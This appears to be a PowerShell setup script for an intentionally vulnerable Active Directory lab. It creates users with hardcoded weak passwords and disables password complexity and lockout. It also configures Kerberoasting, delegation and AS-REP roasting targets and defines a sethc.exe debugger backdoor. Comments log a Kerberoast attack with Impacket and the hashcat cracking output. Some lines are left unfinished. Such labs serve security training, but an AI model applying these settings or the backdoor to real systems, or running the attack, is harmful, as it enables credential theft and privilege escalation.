
#Administrator password is P#ssw0rd
#Password complexity exception for dorothy.

Import-Module ActiveDirectory

#Create the following users.  Only dorothy's password is in rockyou.txt
$users = @{
"msfrizzle" = "takechancesmakemistakesgetmessy"
"liz" = "EsDz7pA9nmeJ"
"arnold" = "IKnewIShouldHaveStayedHomeToday"
"dorothy" = "password"
"keesha" = "BxBnSE29AEbU"
"phoebe" = "@t_My_0ld_sChOOL"
"tim" = "jtC49BEUCpQJ"
"wanda" = "wxdE9Ac3e8kL"
"professorcornelia" = "NPVPq4vaL4VX"
"mrmcclean" = "jonnymcclean"
"mrsinew" = "PpphvVYJJd6w"
}

#create the following groups with membership.
$groups = @{
    "faculty" = ("msfrizzle","professorcornelia","mrmcclean")
    "students" = ("arnold","dorothy","keesha","phoebe","tim","wanda")
    "pets" = ("liz")
}
#Creates a managed service account.  Not sure how to exploit this at this time.
New-ADServiceAccount -Name "magicschoolbus" -AccountPassword ("magicschoolbus" | ConvertTo-SecureString -AsPlainText -Force) -RestrictToSingleComputer -Description "Learning Rules!" -DisplayName "Service Account for testing Kerberoast Techniques (password is magicschoolbus)" -Enabled $true  -ServicePrincipalNames "MSMSB/hoop.local" -AccountExpirationDate "4/20/2420"
#Create Users
$users.keys | ForEach-Object -Process {New-ADUser -Name $_  -AccountExpirationDate "4/20/2420" -AccountPassword ($users.Item($_) | ConvertTo-SecureString -AsPlainText -Force)}
#Create finegrained password policy & add Dorothy
Set-ADFineGrainedPasswordPolicy -Identity MyPolicy -Precedence 10 -LockoutDuration 00:00:00 -LockoutObservationWindow 00:00:00 -ComplexityEnabled $False -ReversibleEncryptionEnabled $True -MinPasswordLength 0
Add-ADFineGrainedPasswordPolicySubject -Identity MyPolicy -Subjects dorothy,msfrizzle,liz
#Set the owner of liz to self
 Get-AdUser -Identity 'liz' | Set-ADUser -SAmAccountName 'liz' -PassThru
$liz =  (Get-ADObject -Filter {Name -eq "liz"}).DistinguishedName
$obj = (Get-ADObject -Filter {DistinguishedName -eq $liz.DistinguishedName})
$aceobj = (Get-Acl -Path("ActiveDirectory:://RootDSE/" + $obj.DistinguishedName))
$liz = 


#Create Groups
$groups.keys | ForEach-Object -Process {Write-Host Creating group $_; New-ADGroup -Name $_ -SamAccountName $_ -GroupScope Global -Path "CN=Users,DC=hoop,DC=local" }
#Add users to groups.
$groups.keys | ForEach-Object -Process {$group = $_; $group | %{Add-ADGroupMember -Identity $group -Members $groups.Item($_) }}

#Setup Constrained Delegation Abuse
Get-ADComputer win7sp1x86 | Set-ADAccountControl -TrustedForDelegation $true

#Setup for Kerberoasting
setspn -A msfrizzle/win7sp1x86.hoop.local:80 msfrizzle
setspn -A superoldserviceaccount/solaris5.hoop.local:1337 dorothy

#Set up a malicious group policy to backdoor osk.exe
$backdoorcommand = 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f'
#testing
#$testcommand = 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\h00p.exe" /t REG_SZ /v testkey /d "h00p was here" /f'
#Push Group policy to all computers
$computers = Get-ADComputer -Filter *
$computers | ForEach-Object -Process {Invoke-GPUpdate -Computer $_.name -RandomDelayInMinutes 0 -Force}

#Check what GPs are applied
#gpresult /r /SCOPE COMPUTER

#Setup ASREP Roasting Attack
Get-AdUser -Identity "mrmcclean" | Set-ADAccountControl  -doesnotrequirepreauth $true
#Check Users requiring no preauth (also use Get-DomainUser)
#Get-ADUser -LdapFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=4194304)"
#ActiveDirectory Module on Powershell2.0 -->https://www.microsoft.com/en-us/download/details.aspx?id=2852
















#Kerberoast Exploitation
setspn -T hoop.local -Q */*
#CN=msfrizzle,CN=Users,DC=hoop,DC=local
#msfrizzle/win7sp1x86.hoop.local:80

#root@kali:/opt/impacket/examples# python GetUserSPNs.py -request -dc-ip 192.168.0.254 'hoop.local/dorothy:password'
# Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

# ServicePrincipalName                             Name       MemberOf                               PasswordLastSet      LastLogon           
# -----------------------------------------------  ---------  -------------------------------------  -------------------  -------------------
# msfrizzle/win7sp1x86.hoop.local:80               msfrizzle  CN=faculty,CN=Users,DC=hoop,DC=local   2019-10-19 13:43:18  2019-10-19 13:45:54 
# superoldserviceaccount/solaris5.hoop.local:1337  dorothy    CN=students,CN=Users,DC=hoop,DC=local  2019-10-19 17:01:14  2019-10-19 17:03:19 



# $krb5tgs$23$*dorothy$HOOP.LOCAL$superoldserviceaccount/solaris5.hoop.local~1337*$5f8ae562fc990d787f6184c3bc538013$0c490245416279a839595b88cbb8748541efeafb2a21346df0a6df3e77719648612dadd64ac81e57e9f2bc08a0292aed731214b08c20cf964f3531d1842c30d20ab3ad40f185b311760bbfe3e78cf8749a58d2b1a63502163ea404ac667582bc7378d41dffe22b3670e7f0a47a3dea60a9bf18213a2804d1ef5e4393886c90b0e57a9051adec6e5f1c0281b2932f3c4c2301c15dc292a805c85f03380fa732c79dd66636ee3ba4a6fa157d008ad2b55a4c66d42c0b0356afd6abcabe45d84dd27cc421ccc0b6fbc1969ba0885e655098080d55ece7738bb43bf3b85442b4bf5168d4ac0997740fe5ec439d48be05946446721022d7fabbdfd90c351b95251e567d8e3e454e056527dc9b6f1d3b897ce7591c683db983247085f41de795138a31ef7f3b07308cf3dee273a1c65d2105093af232f51e7c5686cb5ca657f7de684ac66858fdece3f223210161d0f99620cb38cac60a7a4455b3b85868ea8f36e1808370d13089b784b1aa5275559a81c093d8d8319621f26c56625111f18cb499b033c3c97dad93cc8b148080269d36a45918bedc98b327e8f8383971394cbec7baf2f907b8696c3719fdc99aaa0ac92330a462ec53383f9c901f31ba1292d7a7ed304f4d0f765c6062f765dd2715090f10b8470eb89ac6e5a2fb17ab5e3fcd5fd9dd6e8ec4cd4688845436515427c5b1309be7fc1a9cecc7d7bbaf83ab2dc9b6ef5fa4bb4989fc652b57794ff1938113f6a75ba84b8105781f0124625bff0475f6752f7305aeb26a4dcea2aceae865e58ef9700e6adab916e96478fcafc758f5b1c5e1eaaa4096e93d2f63ea5150001bc5e02a7c220cd38aa7cf0f6c391f20c0bc915e8ddc92f09ac804200d1231dd493933f367c620646ce749c2c4b6bfa247fb2a9a1ef6aa348c3ff87e1076ce8e7ed59901845e57915fe601ff3ad2e82da2b7635ec7891ca47f99aa9e2a0e396113438deb40569ede788b3ee6b784ce5ab28dbdc65631f66f40ce7b31c04d0885ff8eea4a2c30db854ec10d64292e91589291bb553a1dcb476b62d01421e0c1052be09aff09b13d673aa9cfd5753fe09db9a550406a4985b2501863e50fd557430e081dda2533001d4542e8207f9f500203f848c21e19c7402751db9698ff0e3d3ce2eb115100fa7f3a6999eb85e80f7eec53c1189eaad90e2fcdf6140926ce7be29b1442bc285031548601e2cf95af83c15e8cbf1ba43b38ba04e1ca270ac79b811ed70ca8b4a945e7fc397332f1ab0ad2eb3a463278eacd5e164a1f
# $krb5tgs$23$*msfrizzle$HOOP.LOCAL$msfrizzle/win7sp1x86.hoop.local~80*$7d0a465e5cc6cd0b15d95205330fe425$5b753839fd5f6752a5b0472a08fd7eace804650b6b50db1e13a98e160a1c0346f607e87d8b934676cf2cc07d51a81c5be0dafc056f249fd37eb12ad2f4afda4cdc02612d0c28f7e67e1272e8fbeae49d36d425acbd1bae7eae03139831327519f1516b97d35a08ebf94fdddec972139f6f7b73c1ae8f7219658c0d367a7e3a246944dfc0b009f8bd3426558cefdcf06eb5217a7c4bdbc2cb6dc8b6e25c5a630c28e284994127b71244799c7a05322a9c2c51d4c45697e39b77428b933c0f307207d3eaa4338faf27c67bdfb9c1bb7e41147ce24e0e10ecc1e2f0e20e1d3cce5700031eb729d1d5df675c14607389be6c1eea16af78b355d8d1f75996d1d2bd6168019d2327302b0253ee163301dea10368296ee277772a188313a3733bbb2f89ef70b5f34ce87394f70149f45aeb4378a1082a9dc4c18600293f0297b634227c29173cc5cdd11559371f4933b61f5c16cd782ce04e4a2590360bb4f9fdd91b9db430c77b21e5b1d190044091bd516d2479e41346f030e185adcdbdbfd045964f68ce7e29fcf0a2f9caf94e8cd937004703d0b60dcea33daefbb0790f9e4ec0dea353ab90ae61919e6490419cd83898871c97a19cee6516dd4df608733ee51f6aafe87046c57e861cd9bd84cf3949023a22a779c482999262a6f3725fe3680f0b1e028fb4b39f23d4e1e5694faa9f35447afc49c6fc848e0837b0b269e45cce027ab55ee9ea3d6bdc9ef0ec7818fd5eda2aa365e116dce5d45fff59629b93be365c13ccdf79c8dddbfff20b1a36e28a6a6ce12c6f3a066dcc1794ad8c4f78934f3081c95a5b8f9557e3f82054341ddea9984ecf5c1f6261058774b5189b3e9a723a56c72b9e7fc69129988fc19ad11ab9793bf0df33dcd61c758da9635e7ee0bb297266dd2fd45f72c2a894eb676466ead582c2e9e1ada8ad52c366caafa5929329e51f04eb6689791a870016acf5ac0d9b4654d6303136a784810e1468e72a1e86abc6e32625744ea8031e072fc6b437443b41c7e64e18b8fbf96b406715018bdf62c92321ce62235a780409cf9e4ded0e02914c223fa22d581c445f6431036fc30029a2e3411442f55781fa1e089bfa4ef5b96c31cb7b97ee8eebf81ad2a02b9cecf79925565bea3e8246ce6bd206ee48152c2d24bcc935edaab4f68a4954e8009b8e685ff605af62d075f653d8dab600adab36121e4b76efc00b664b9279ed4857ca0e23c96724d7b8228893846ac6010aa033fbee0f3190fc832b920ce5e9f56157f25c59d34cf95e

# 

#$krb5tgs$23$*dorothy$HOOP.LOCAL$superoldserviceaccount/solaris5.hoop.local~1337*$5f8ae562fc990d787f6184c3bc538013$0c490245416279a839595b88cbb8748541efeafb2a21346df0a6df3e77719648612dadd64ac81e57e9f2bc08a0292aed731214b08c20cf964f3531d1842c30d20ab3ad40f185b311760bbfe3e78cf8749a58d2b1a63502163ea404ac667582bc7378d41dffe22b3670e7f0a47a3dea60a9bf18213a2804d1ef5e4393886c90b0e57a9051adec6e5f1c0281b2932f3c4c2301c15dc292a805c85f03380fa732c79dd66636ee3ba4a6fa157d008ad2b55a4c66d42c0b0356afd6abcabe45d84dd27cc421ccc0b6fbc1969ba0885e655098080d55ece7738bb43bf3b85442b4bf5168d4ac0997740fe5ec439d48be05946446721022d7fabbdfd90c351b95251e567d8e3e454e056527dc9b6f1d3b897ce7591c683db983247085f41de795138a31ef7f3b07308cf3dee273a1c65d2105093af232f51e7c5686cb5ca657f7de684ac66858fdece3f223210161d0f99620cb38cac60a7a4455b3b85868ea8f36e1808370d13089b784b1aa5275559a81c093d8d8319621f26c56625111f18cb499b033c3c97dad93cc8b148080269d36a45918bedc98b327e8f8383971394cbec7baf2f907b8696c3719fdc99aaa0ac92330a462ec53383f9c901f31ba1292d7a7ed304f4d0f765c6062f765dd2715090f10b8470eb89ac6e5a2fb17ab5e3fcd5fd9dd6e8ec4cd4688845436515427c5b1309be7fc1a9cecc7d7bbaf83ab2dc9b6ef5fa4bb4989fc652b57794ff1938113f6a75ba84b8105781f0124625bff0475f6752f7305aeb26a4dcea2aceae865e58ef9700e6adab916e96478fcafc758f5b1c5e1eaaa4096e93d2f63ea5150001bc5e02a7c220cd38aa7cf0f6c391f20c0bc915e8ddc92f09ac804200d1231dd493933f367c620646ce749c2c4b6bfa247fb2a9a1ef6aa348c3ff87e1076ce8e7ed59901845e57915fe601ff3ad2e82da2b7635ec7891ca47f99aa9e2a0e396113438deb40569ede788b3ee6b784ce5ab28dbdc65631f66f40ce7b31c04d0885ff8eea4a2c30db854ec10d64292e91589291bb553a1dcb476b62d01421e0c1052be09aff09b13d673aa9cfd5753fe09db9a550406a4985b2501863e50fd557430e081dda2533001d4542e8207f9f500203f848c21e19c7402751db9698ff0e3d3ce2eb115100fa7f3a6999eb85e80f7eec53c1189eaad90e2fcdf6140926ce7be29b1442bc285031548601e2cf95af83c15e8cbf1ba43b38ba04e1ca270ac79b811ed70ca8b4a945e7fc397332f1ab0ad2eb3a463278eacd5e164a1f
# .\hashcat64.exe -m 13100 C:\Users\Cary\Desktop\hash -o C:\Users\Cary\Desktop\hash.out E:\Downloads\master.hoop.txt


# Session..........: hashcat
# Status...........: Cracked
# Hash.Type........: Kerberos 5 TGS-REP etype 23
# Time.Started.....: Sat Oct 19 16:10:09 2019 (4 secs)
# Time.Estimated...: Sat Oct 19 16:10:13 2019 (0 secs)
# Guess.Base.......: File (E:\Downloads\master.hoop.txt)
# Guess.Queue......: 1/1 (100.00%)
# Speed.#1.........:  5544.1 kH/s (7.58ms) @ Accel:512 Loops:1 Thr:64 Vec:1
# Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
# Progress.........: 23789568/31936660 (74.49%)
# Rejected.........: 0/23789568 (0.00%)
# Restore.Point....: 23592960/31936660 (73.87%)
# Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
# Candidates.#1....: passoires -> percieline
# Hardware.Mon.#1..: Temp: 34c Fan: 35% Util: 42% Core:1809MHz Mem:3504MHz Bus:16